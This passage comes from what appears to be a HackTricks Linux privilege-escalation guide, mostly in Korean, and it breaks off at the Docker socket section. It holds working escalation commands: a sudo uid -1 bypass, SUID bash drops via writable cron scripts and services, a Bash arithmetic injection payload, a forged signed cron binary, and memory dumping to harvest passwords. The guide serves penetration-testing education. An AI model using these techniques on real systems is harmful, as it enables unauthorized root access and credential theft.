# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 시스템 정보

### OS 정보

이제 실행 중인 OS에 대한 정보를 수집해보겠습니다.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### 경로

만약 **`PATH` 변수 안의 어떤 폴더에 대해 쓰기 권한이 있다면** 일부 라이브러리나 바이너리를 hijack할 수 있습니다:
```bash
echo $PATH
```
### 환경 정보

환경 변수에 흥미로운 정보, 비밀번호 또는 API 키가 있나요?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel 버전을 확인하고, escalate privileges에 사용할 수 있는 exploit이 있는지 확인하세요.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
여기에서 좋은 취약한 커널 목록과 이미 **compiled exploits** 몇 개를 찾을 수 있습니다: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
또한 **compiled exploits** 를 찾을 수 있는 다른 사이트들: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

해당 웹에서 모든 취약한 커널 버전을 추출하려면 다음을 실행하면 됩니다:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
커널 exploits를 검색하는 데 도움이 되는 도구:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim에서 실행, kernel 2.x용 exploit만 확인)

항상 **kernel 버전을 Google에서 검색**하세요. 해당 kernel 버전이 어떤 kernel exploit에 명시되어 있을 수 있으므로, 그러면 그 exploit이 유효한지 확신할 수 있습니다.

추가적인 kernel exploitation 기법:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 버전

다음에 나타나는 취약한 sudo 버전을 기반으로:
```bash
searchsploit sudo
```
이 grep을 사용해 sudo 버전이 취약한지 확인할 수 있습니다.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo versions before 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**)은 권한이 없는 로컬 사용자가 사용자가 제어하는 디렉터리에서 `/etc/nsswitch.conf` 파일을 사용할 때 sudo `--chroot` 옵션을 통해 root로 권한을 상승시킬 수 있게 합니다.

여기 해당 [취약점](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)을 exploit하기 위한 [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)가 있습니다. exploit을 실행하기 전에 `sudo` 버전이 취약한지, 그리고 `chroot` 기능을 지원하는지 확인하세요.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 서명 검증 실패

**smasher2 box of HTB**에서 이 vuln이 어떻게 악용될 수 있는지에 대한 **예시**를 확인하세요.
```bash
dmesg 2>/dev/null | grep "signature"
```
### 더 많은 시스템 열거
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 가능한 방어책 열거

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

만약 docker container 안에 있다면 탈출을 시도할 수 있습니다:


{{#ref}}
docker-security/
{{#endref}}

## 드라이브

**무엇이 마운트되어 있고 언마운트되어 있는지**, 어디에 왜 그런지 확인하세요. 만약 어떤 항목이 unmounted 상태라면 마운트해서 민감한 정보를 확인해보세요.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 유용한 소프트웨어

유용한 바이너리를 나열합니다
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
또한 **컴파일러가 설치되어 있는지** 확인하세요. 이는 kernel exploit을 사용해야 할 경우에 유용하며, 해당 exploit은 사용하려는 머신(또는 유사한 머신)에서 컴파일하는 것이 권장됩니다.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 취약한 소프트웨어가 설치되어 있음

설치된 패키지 및 서비스의 **버전을 확인하세요**. 예를 들어 오래된 Nagios 버전이 있어 privilege escalation에 악용될 수 있습니다…\
더 의심스러운 설치된 소프트웨어의 버전은 수동으로 확인하는 것이 권장됩니다.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
대상 머신에 SSH로 접근할 수 있다면, 설치된 구식 또는 취약한 소프트웨어를 검사하기 위해 **openVAS**를 사용할 수도 있습니다.

> [!NOTE] > _이 명령들은 대부분 쓸모없는 많은 정보를 표시할 수 있으므로, 설치된 소프트웨어 버전이 알려진 exploits에 취약한지 검사하는 OpenVAS 같은 애플리케이션 사용을 권장합니다_

## 프로세스

실행 중인 **어떤 프로세스**들이 있는지 살펴보고, 어떤 프로세스가 **정상적이어야 할 권한보다 더 높은 권한**으로 실행되고 있는지 확인하세요 (예: tomcat이 root로 실행되는 경우?)
```bash
ps aux
ps -ef
top -n 1
```
항상 [**electron/cef/chromium debuggers**가 실행 중인지 확인하세요 — 이를 악용해 권한을 상승시킬 수 있습니다](electron-cef-chromium-debugger-abuse.md). **Linpeas**는 프로세스 명령줄에서 `--inspect` 파라미터를 확인해 이를 탐지합니다.\
또한 **프로세스 바이너리에 대한 권한을 확인하세요**, 다른 사용자의 바이너리를 덮어쓸 수 있을지도 모릅니다.

### 프로세스 모니터링

프로세스를 모니터링하기 위해 [**pspy**](https://github.com/DominicBreuker/pspy) 같은 도구를 사용할 수 있습니다. 이는 취약한 프로세스가 자주 실행되거나 특정 조건이 충족될 때 이를 식별하는 데 매우 유용합니다.

### 프로세스 메모리

일부 서버 서비스는 **credentials in clear text inside the memory**를 메모리에 저장합니다.\
일반적으로 다른 사용자에 속한 프로세스의 메모리를 읽으려면 **root privileges**가 필요하므로, 이는 보통 이미 root인 상태에서 더 많은 자격증명을 찾아내는 데 유용합니다.\
그러나 **as a regular user you can read the memory of the processes you own**라는 점을 잊지 마세요.

> [!WARNING]
> 요즘 대부분의 머신은 기본적으로 **don't allow ptrace by default** 한다는 점을 참고하세요. 이는 권한이 없는 사용자에 속한 다른 프로세스를 덤프할 수 없다는 의미입니다.
>
> 파일 _**/proc/sys/kernel/yama/ptrace_scope**_가 ptrace 접근성을 제어합니다:
>
> - **kernel.yama.ptrace_scope = 0**: 동일한 uid를 가진 경우 모든 프로세스를 디버그할 수 있습니다. 이것이 전통적인 ptracing 작동 방식입니다.
> - **kernel.yama.ptrace_scope = 1**: 부모 프로세스만 디버그할 수 있습니다.
> - **kernel.yama.ptrace_scope = 2**: ptrace를 사용하려면 CAP_SYS_PTRACE 권한이 필요하므로 관리자만 ptrace를 사용할 수 있습니다.
> - **kernel.yama.ptrace_scope = 3**: ptrace로 추적할 수 있는 프로세스가 없습니다. 일단 설정되면 ptracing을 다시 가능하게 하려면 재부팅이 필요합니다.

#### GDB

예를 들어 FTP 서비스의 메모리에 접근할 수 있다면 Heap을 덤프하여 그 내부의 credentials를 검색할 수 있습니다.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

주어진 프로세스 ID에 대해, **maps가 해당 프로세스의 가상 주소 공간 내에서 메모리가 어떻게 매핑되어 있는지** 보여주며; 또한 **각 매핑된 영역의 권한**을 표시합니다.  
**mem** 의사 파일은 **프로세스의 메모리 자체를 노출합니다**.  
**maps** 파일로부터 우리는 어떤 **메모리 영역이 읽기 가능한지**와 그 오프셋을 알 수 있습니다.  
우리는 이 정보를 사용해 **mem 파일에서 seek하여 모든 읽기 가능한 영역을 dump**하고 이를 파일로 저장합니다.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`은 시스템의 **물리적** 메모리에 대한 접근을 제공하며, 가상 메모리가 아닙니다. 커널의 가상 주소 공간은 /dev/kmem을 사용하여 접근할 수 있습니다.\
일반적으로, `/dev/mem`은 **root**와 **kmem** 그룹만 읽을 수 있습니다.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump는 Windows용 Sysinternals 도구 모음에 있던 고전적인 ProcDump 도구를 Linux용으로 재구성한 것입니다. 다운로드: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 도구

프로세스 메모리를 덤프하려면 다음을 사용할 수 있습니다:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_수동으로 root 요구사항을 제거하고 본인이 소유한 프로세스를 덤프할 수 있습니다
- Script A.5는 [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf)에서 (root is required)

### 프로세스 메모리에서의 자격 증명

#### 수동 예제

authenticator 프로세스가 실행 중인 것을 발견하면:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
프로세스를 dump할 수 있습니다 (앞의 섹션들을 참조하여 프로세스의 memory를 dump하는 다양한 방법을 확인하세요) 그리고 memory 내부에서 credentials를 검색하세요:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

이 도구 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin)는 **steal clear text credentials from memory** 및 몇몇 **well known files**에서 정보를 훔칩니다. 제대로 작동하려면 root 권한이 필요합니다.

| 기능                                              | 프로세스 이름         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 검색 정규식/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 예약/Cron jobs

### Crontab UI (alseambusher)가 root로 실행 중 – 웹 기반 스케줄러 privesc

웹 “Crontab UI” 패널(alseambusher/crontab-ui)이 root로 실행되고 loopback에만 바인딩되어 있어도, SSH local port-forwarding을 통해 접근하여 권한 있는 작업을 생성해 권한을 상승시킬 수 있습니다.

Typical chain
- loopback 전용 포트(예: 127.0.0.1:8000)와 Basic-Auth realm을 `ss -ntlp` / `curl -v localhost:8000`로 발견
- 운영 아티팩트에서 자격 증명 찾기:
- 백업/스크립트: `zip -P <password>`
- systemd unit에서 `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` 노출
- 터널링 후 로그인:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- high-priv job을 생성하고 즉시 실행(SUID shell을 드롭함):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 사용하세요:
```bash
/tmp/rootshell -p   # root shell
```
하드닝
- Crontab UI를 root로 실행하지 마세요; 전용 사용자와 최소 권한으로 제한하세요
- localhost에 바인드하고 추가로 firewall/VPN으로 접근을 제한하세요; 비밀번호를 재사용하지 마세요
- unit 파일에 secrets를 포함하지 마세요; secret stores 또는 root 전용 EnvironmentFile을 사용하세요
- on-demand 작업 실행에 대해 audit/logging을 활성화하세요

스케줄된 작업이 취약한지 확인하세요. 아마 root에 의해 실행되는 스크립트를 이용할 수 있을지도 모릅니다 (wildcard vuln? root가 사용하는 파일을 수정할 수 있는가? symlinks를 사용? root가 사용하는 디렉터리에 특정 파일을 생성?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron 경로

예를 들어, _/etc/crontab_ 안에서 다음과 같은 PATH를 찾을 수 있습니다: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_/home/user에 대해 "user" 사용자가 쓰기 권한을 가지고 있는 것에 주목하세요_)

이 crontab 안에서 root 사용자가 PATH를 설정하지 않은 채로 어떤 명령이나 스크립트를 실행하려고 한다면. 예를 들어: _\* \* \* \* root overwrite.sh_\
그러면, 다음을 사용해 root 쉘을 얻을 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron이 wildcard를 포함한 script를 사용하는 경우 (Wildcard Injection)

root에 의해 실행되는 script가 명령어에 “**\***”를 포함하고 있다면, 이를 악용해 예상치 못한 동작(예: privesc)을 일으킬 수 있습니다. 예:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**와일드카드가 다음과 같은 경로 앞에 있으면** _**/some/path/\***_ **취약하지 않습니다 (심지어** _**./\***_ **도 마찬가지입니다).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: 파싱되는 로그에 공격자가 제어하는 텍스트를 기록하게 해서 숫자로 보이는 필드에 command substitution이 포함되고 끝이 숫자가 되게 만드세요. 명령이 stdout에 출력하지 않도록 하거나 리다이렉트하여 산술이 유효하도록 하십시오.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

루트로 실행되는 **can modify a cron script** 라면, 매우 쉽게 쉘을 얻을 수 있습니다:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root에 의해 실행되는 스크립트가 당신이 **완전한 접근 권한을 가진 디렉터리**를 사용한다면, 그 폴더를 삭제하고 당신이 제어하는 스크립트를 제공하는 다른 폴더로 연결되는 **다른 폴더를 가리키는 symlink 폴더를 생성**하는 것이 유용할 수 있다
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries with writable payloads
블루팀은 때때로 cron으로 실행되는 바이너리를 '서명'하기 위해 커스텀 ELF 섹션을 덤프하고 벤더 문자열을 grep해서 root로 실행하기 전에 확인합니다. 만약 그 바이너리가 그룹 쓰기 가능(예: `/opt/AV/periodic-checks/monitor`가 `root:devs 770` 소유)하고 서명 자료를 leak할 수 있다면, 섹션을 위조하여 cron 작업을 탈취할 수 있습니다:

1. `pspy`를 사용해 검증 흐름을 캡처합니다. Era에서는 root가 `objcopy --dump-section .text_sig=text_sig_section.bin monitor`를 실행한 다음 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`을 실행하고 파일을 실행했습니다.
2. leaked key/config (from `signing.zip`)를 사용해 예상되는 인증서를 재생성합니다:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. 악성 대체 파일을 빌드(예: SUID bash를 drop, SSH 키 추가)하고 인증서를 `.text_sig`에 임베드하여 grep이 통과하게 만듭니다:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. 실행 비트는 보존하면서 스케줄된 바이너리를 덮어씁니다:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 다음 cron 실행을 기다리면, 단순한 서명 검사에 통과하는 순간 페이로드가 root로 실행됩니다.

### Frequent cron jobs

프로세스를 모니터링하여 1, 2 또는 5분마다 실행되는 프로세스를 찾을 수 있습니다. 이를 이용해 권한 상승을 시도할 수 있습니다.

예를 들어, **1분 동안 0.1초 간격으로 모니터링**하고, **실행 횟수가 적은 명령으로 정렬**한 다음 가장 많이 실행된 명령들을 삭제하려면 다음을 실행할 수 있습니다:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**다음도 사용할 수 있습니다** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (이는 시작되는 모든 프로세스를 모니터링하고 나열합니다).

### 보이지 않는 cron jobs

주석 뒤에 **carriage return을 넣는 것**(newline character 없이)으로 cronjob을 생성할 수 있으며, cron job이 작동합니다. 예시 (carriage return 문자에 주의):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 서비스

### 쓰기 가능한 _.service_ 파일

임의의 `.service` 파일을 쓸 수 있는지 확인하세요. 쓸 수 있다면, 해당 파일을 **수정하여** 서비스가 **시작될 때**, **재시작될 때** 또는 **중지될 때** 귀하의 **backdoor를 실행하도록** 만들 수 있습니다(기계가 재부팅될 때까지 기다려야 할 수도 있습니다).\
예를 들어 .service 파일 내부에 **`ExecStart=/tmp/script.sh`**로 backdoor를 생성하세요.

### 쓰기 가능한 서비스 바이너리

**서비스가 실행하는 바이너리에 대한 쓰기 권한이 있다면**, 해당 바이너리를 backdoors로 변경할 수 있으므로 서비스가 다시 실행될 때 backdoors도 실행됩니다.

### systemd PATH - 상대 경로

다음 명령으로 **systemd**가 사용하는 PATH를 확인할 수 있습니다:
```bash
systemctl show-environment
```
경로의 폴더 중 어느 곳에서든 **write** 할 수 있다면 **escalate privileges** 할 수 있을지도 모릅니다. 다음과 같은 서비스 구성 파일에서 **relative paths being used on service configurations** 를 찾아야 합니다:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
그런 다음, 쓸 수 있는 systemd PATH 폴더 안에 **실행 파일**을 만들되, **상대 경로 바이너리와 같은 이름**으로 만들고, 서비스가 취약한 동작(**Start**, **Stop**, **Reload**)을 실행하도록 요청될 때 당신의 **backdoor는 실행됩니다** (`sudo -l`을 사용할 수 있는지 확인하세요 — 일반적으로 비권한 사용자는 서비스를 시작/중지할 수 없습니다).

**서비스에 대해 더 알고 싶다면 `man systemd.service`를 참조하세요.**

## **타이머**

**타이머**는 이름이 `**.timer**`로 끝나는 systemd unit 파일로서 `**.service**` 파일이나 이벤트를 제어합니다. **타이머**는 캘린더 시간 이벤트와 모노토닉 시간 이벤트를 기본적으로 지원하고 비동기적으로 실행할 수 있기 때문에 cron의 대안으로 사용할 수 있습니다.

You can enumerate all the timers with:
```bash
systemctl list-timers --all
```
### 쓰기 가능한 타이머

타이머를 수정할 수 있다면 systemd.unit의 기존 항목(예: `.service` 또는 `.target`)을 실행하도록 만들 수 있습니다.
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> 타이머가 만료될 때 활성화할 Unit입니다. 인수는 접미사가 ".timer"가 아닌 unit 이름입니다. 지정하지 않으면 이 값은 타이머 unit과 이름이 같고 접미사만 다른 service로 기본값이 설정됩니다. (위 참조.) 활성화되는 unit 이름과 타이머 unit의 이름은 접미사를 제외하고 동일하게 명명하는 것이 권장됩니다.

Therefore, to abuse this permission you would need to:

- **상대 경로를 실행하는** systemd unit을 찾고, 해당 **systemd PATH**에 대해 **쓰기 권한**을 가지고 있어야 합니다 (해당 실행파일을 가장하기 위함)
- **쓰기 가능한 바이너리**를 실행하는 systemd unit(예: `.service`)을 찾습니다

**Learn more about timers with `man systemd.timer`.**

### **타이머 활성화**

타이머를 활성화하려면 root 권한이 필요하며 다음을 실행해야 합니다:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## 소켓

Unix Domain Sockets (UDS)는 클라이언트-서버 모델 내에서 동일하거나 다른 머신 간의 **프로세스 통신**을 가능하게 합니다. 이들은 컴퓨터 간 통신을 위해 표준 Unix 디스크립터 파일을 사용하며 `.socket` 파일을 통해 설정됩니다.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** 이 파일 안에서는 여러 흥미로운 매개변수를 설정할 수 있습니다:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 이 옵션들은 서로 다르지만 요약하면 **어디에서 리스닝할지**(AF_UNIX 소켓 파일의 경로, 리스닝할 IPv4/6 및/또는 포트 번호 등)를 지정합니다.
- `Accept`: boolean 인수를 받습니다. **true**이면 **들어오는 각 연결마다 서비스 인스턴스가 생성**되고 연결 소켓만 그 인스턴스에 전달됩니다. **false**이면 모든 리스닝 소켓 자체가 **시작된 서비스 유닛에 전달**되며 모든 연결에 대해 하나의 서비스 유닛만 생성됩니다. 이 값은 datagram 소켓과 FIFO에 대해서는 무시되며 이 경우 단일 서비스 유닛이 무조건 모든 들어오는 트래픽을 처리합니다. **기본값은 false입니다**. 성능상의 이유로, 새로운 데몬은 `Accept=no`에 적합한 방식으로만 작성하는 것이 권장됩니다.
- `ExecStartPre`, `ExecStartPost`: 하나 이상 커맨드 라인을 받으며, 이는 리스닝 **소켓**/FIFO가 각각 **생성**되고 바인드되기 **전에** 또는 **후에** **실행**됩니다. 커맨드 라인의 첫 토큰은 절대 경로의 파일 이름이어야 하며, 그 뒤에 프로세스 인수가 옵니다.
- `ExecStopPre`, `ExecStopPost`: 리스닝 **소켓**/FIFO가 각각 **닫히고** 제거되기 **전** 또는 **후**에 **실행되는** 추가 **명령**입니다.
- `Service`: **들어오는 트래픽**에 대해 **활성화할** 서비스 유닛 이름을 지정합니다. 이 설정은 Accept=no인 소켓에서만 허용됩니다. 기본값은 소켓과 동일한 이름을 가진 서비스입니다(접미사가 교체됨). 대부분의 경우 이 옵션을 사용할 필요는 없습니다.

### 쓰기 가능한 .socket 파일

쓰기 가능한 `.socket` 파일을 찾으면 `[Socket]` 섹션의 시작 부분에 `ExecStartPre=/home/kali/sys/backdoor` 같은 항목을 **추가할 수 있으며**, 해당 backdoor는 소켓이 생성되기 전에 실행됩니다. 따라서 **아마도 머신을 재부팅할 때까지 기다려야 할 것입니다.**\
_해당 소켓 파일 구성이 시스템에서 사용 중이어야만 backdoor가 실행된다는 점에 유의하세요._

### 쓰기 가능한 소켓

(지금은 설정 `.socket` 파일이 아니라 Unix 소켓에 대해 말하는 것입니다) 만약 **쓰기 가능한 소켓**을 찾으면, 해당 소켓과 **통신할 수 있고** 취약점을 이용해 공격할 수 있을지도 모릅니다.

### Unix 소켓 열거
```bash
netstat -a -p --unix
```
### 원시 연결
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation 예시:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

일부 **sockets listening for HTTP** 요청이 있을 수 있습니다 (_여기서는 .socket files가 아니라 unix sockets로 동작하는 파일들을 말하는 것입니다_). 다음 명령어로 확인할 수 있습니다:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
소켓이 **HTTP 요청에 응답**하면 해당 소켓과 **통신**할 수 있으며, 어쩌면 **exploit some vulnerability**할 수도 있습니다.

### 쓰기 가능한 Docker 소켓

Docker 소켓은 보통 `/var/run/docker.sock`에 위치하며, 보호되어야 하는 중요한 파일입니다. 기본적으로 이 소켓은 `root` 사용자와 `docker` 그룹의 멤버들이 쓸 수 있습니다. 이 소켓에 대한 쓰기 권한을 가지면 privilege escalation으로 이어질 수 있습니다. 다음은 이를 수행하는 방법과 Docker CLI를 사용할 수 없을 때의 대체 방법에 대한 개요입니다.

#### **Privilege Escalation with Docker CLI**

